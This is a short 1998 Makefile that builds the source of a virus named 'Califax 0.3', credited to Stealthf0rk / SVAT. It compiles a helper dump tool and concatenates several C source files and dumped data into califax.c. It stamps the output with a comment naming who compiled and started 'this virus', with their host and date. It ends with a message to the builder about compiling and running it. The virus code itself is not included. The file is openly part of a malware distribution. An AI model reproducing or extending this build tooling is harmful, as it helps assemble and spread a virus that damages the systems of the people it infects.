# Makefile for Califax 0.3
#
# (C)opyright 1998 by Stealthf0rk / SVAT <stealth@cyberspace.org>
# Use it under the terms of the GPL.

GREP = grep
DUMP = ./dump
SRC1 = _head.c
SRC2 = udos.c
MAIN = main.c
CC = gcc

all: califax

califax:
	
	$(CC) -O2 dump.c -o dump
	@rm -f B C
	@cp $(SRC1) B.c
	@cp $(SRC2) C.c
	@echo -e "/** This virus was compiled and started by `whoami`@`uname -n`" >> C.c
	@echo -e " ** on `date`\n **/" >> C.c
	@$(DUMP) B.c C.c
	@cat B.c > TMP
	@cat B >> TMP
	@cat C >> TMP
	@echo -e "\n\nunsigned char key[] = {0x00, 0x00, 0x00, 0x00};\n\n" >> TMP
	@cat C.c >> TMP
	@cat $(MAIN) >> TMP
	@rm -f B C B.c C.c
	@mv TMP califax.c
	@echo -e "Ok, califax.c was built. You should know how to compile it"
	@echo -e "If you are lame or you want to do sth. bad, dont run it.\n"



